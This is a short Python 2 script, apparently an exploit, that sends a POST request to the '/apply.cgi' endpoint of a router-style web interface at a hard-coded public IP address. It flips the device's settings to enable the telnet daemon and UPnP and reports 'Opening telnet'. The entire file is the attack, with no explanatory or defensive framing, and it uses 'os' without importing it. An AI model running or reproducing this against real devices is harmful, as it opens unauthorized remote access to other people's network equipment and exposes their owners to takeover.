import sys

import requests

#url = sys.argv[1]

url = 'http://124.152.236.162'

if 'http' not in url: os._exit()

url = "{}/apply.cgi".format(url)

data = "igmp_enable=0&upnp_enable=1&syslogd_enable=1&telnetd_enable=1&reboot_enable=0&submit_button=st_device&change_action=&action=Apply&upnpEn=on&remote_management=0&rtelnetd=0&syslogd=0&reboot_start_hour=0&reboot_start_min=0"

print '[*] Opening telnet ..'

req = requests.post(url, data=data)

if req.status_code == 200:

    print '[*] Success ..'